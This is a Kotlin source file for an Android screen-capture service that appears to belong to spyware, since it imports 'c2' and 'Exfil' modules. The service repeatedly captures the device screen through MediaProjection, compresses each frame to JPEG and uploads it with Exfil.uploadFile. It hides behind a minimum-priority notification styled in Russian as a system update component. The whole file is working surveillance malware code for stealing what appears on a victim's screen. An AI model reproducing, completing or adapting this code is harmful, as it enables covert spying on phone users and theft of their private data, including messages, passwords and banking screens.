package com.sp.core.services

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.sp.core.c2.Exfil
import com.sp.core.util.Fgs
import java.io.ByteArrayOutputStream
import java.io.File

/**
 * Real screen capture: MediaProjection -> VirtualDisplay -> ImageReader -> JPEG -> C2.
 * Runs as a foreground service with the mediaProjection type (mandatory on API 34+).
 */
class ScreenCapture : Service() {

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var reader: ImageReader? = null

    private var shots = 0
    private var maxShots = 1
    private var intervalMs = 0L

    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        if (!Fgs.start(this, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION,
                buildNotification())) {
            stopSelf()
            return
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
        @Suppress("DEPRECATION")
        val data: Intent? = intent?.getParcelableExtra(EXTRA_RESULT_DATA)
        maxShots = intent?.getIntExtra(EXTRA_SHOTS, 1) ?: 1
        intervalMs = intent?.getLongExtra(EXTRA_INTERVAL, 0L) ?: 0L

        if (resultCode == 0 || data == null) {
            stopSelf()
            return START_NOT_STICKY
        }
        startProjection(resultCode, data)
        return START_STICKY
    }

    private fun startProjection(resultCode: Int, data: Intent) {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val p = mpm.getMediaProjection(resultCode, data) ?: run { stopSelf(); return }
            projection = p

            if (Build.VERSION.SDK_INT >= 34) {
                p.registerCallback(object : MediaProjection.Callback() {
                    override fun onStop() {
                        Log.i(TAG, "projection stopped by system")
                        stopSelf()
                    }
                }, handler)
            }

            val metrics = resources.displayMetrics
            val width = metrics.widthPixels
            val height = metrics.heightPixels
            val dpi = metrics.densityDpi

            val imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
            imageReader.setOnImageAvailableListener({ source ->
                val image = source.acquireLatestImage()
                if (image == null) return@setOnImageAvailableListener
                try {
                    val bitmap = toBitmap(image)
                    val jpeg = ByteArrayOutputStream()
                    bitmap.compress(Bitmap.CompressFormat.JPEG, 72, jpeg)
                    bitmap.recycle()

                    val file = File(cacheDir, "scr_${System.currentTimeMillis()}.jpg")
                    file.writeBytes(jpeg.toByteArray())
                    Exfil.uploadFile(this, file, "screenshot")

                    shots++
                    if (shots < maxShots) scheduleNext() else stopSelf()
                } catch (t: Throwable) {
                    Log.w(TAG, "capture failed: ${t.message}")
                    try { image.close() } catch (_: Throwable) {}
                    stopSelf()
                }
            }, handler)
            reader = imageReader

            virtualDisplay = p.createVirtualDisplay(
                "sp",
                width,
                height,
                dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.surface,
                null,
                handler
            )
        } catch (t: Throwable) {
            Log.e(TAG, "projection init failed: ${t.message}")
            stopSelf()
        }
    }

    private fun scheduleNext() {
        val delay = if (intervalMs > 0) intervalMs else 1000L
        handler.postDelayed({ takeAgain() }, delay)
    }

    private fun takeAgain() {
        try {
            val image = reader?.acquireLatestImage() ?: return
            val bitmap = toBitmap(image)
            val jpeg = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 72, jpeg)
            bitmap.recycle()
            val file = File(cacheDir, "scr_${System.currentTimeMillis()}.jpg")
            file.writeBytes(jpeg.toByteArray())
            Exfil.uploadFile(this, file, "screenshot")
            shots++
            if (shots < maxShots) scheduleNext() else stopSelf()
        } catch (_: Throwable) {
            stopSelf()
        }
    }

    private fun toBitmap(image: Image): Bitmap {
        val plane = image.planes[0]
        val buffer = plane.buffer
        val pixelStride = plane.pixelStride
        val rowStride = plane.rowStride
        val width = image.width
        val height = image.height

        val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
        val row = ByteArray(rowStride)
        val out = IntArray(width * height)

        var offset = 0
        for (y in 0 until height) {
            val remaining = buffer.remaining()
            if (remaining <= 0) break
            val chunk = minOf(rowStride, remaining)
            buffer.get(row, 0, chunk)
            var x = 0
            var i = 0
            while (x < width && i + 3 < chunk) {
                val r = row[i].toInt() and 0xFF
                val g = row[i + 1].toInt() and 0xFF
                val b = row[i + 2].toInt() and 0xFF
                out[offset + x] = (0xFF shl 24) or (r shl 16) or (g shl 8) or b
                i += pixelStride
                x++
            }
            offset += width
        }
        bitmap.setPixels(out, 0, width, 0, 0, width, height)
        return bitmap
    }

    override fun onDestroy() {
        try { virtualDisplay?.release() } catch (_: Throwable) {}
        try { reader?.close() } catch (_: Throwable) {}
        try { projection?.stop() } catch (_: Throwable) {}
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        val chId = "sys_update"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(chId, "Обновление системы",
                NotificationManager.IMPORTANCE_MIN).apply { setShowBadge(false) }
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, chId)
            .setContentTitle("android_UI")
            .setContentText("Системный компонент работает")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .build()
    }

    companion object {
        private const val TAG = "ScreenCapture"
        private const val NOTIF_ID = 0x5F63
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val EXTRA_SHOTS = "shots"
        const val EXTRA_INTERVAL = "interval_ms"

        fun start(ctx: Context, resultCode: Int, data: Intent, shots: Int = 1, intervalMs: Long = 0L) {
            val i = Intent(ctx, ScreenCapture::class.java)
                .putExtra(EXTRA_RESULT_CODE, resultCode)
                .putExtra(EXTRA_RESULT_DATA, data)
                .putExtra(EXTRA_SHOTS, shots)
                .putExtra(EXTRA_INTERVAL, intervalMs)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i) else ctx.startService(i)
        }
    }
}
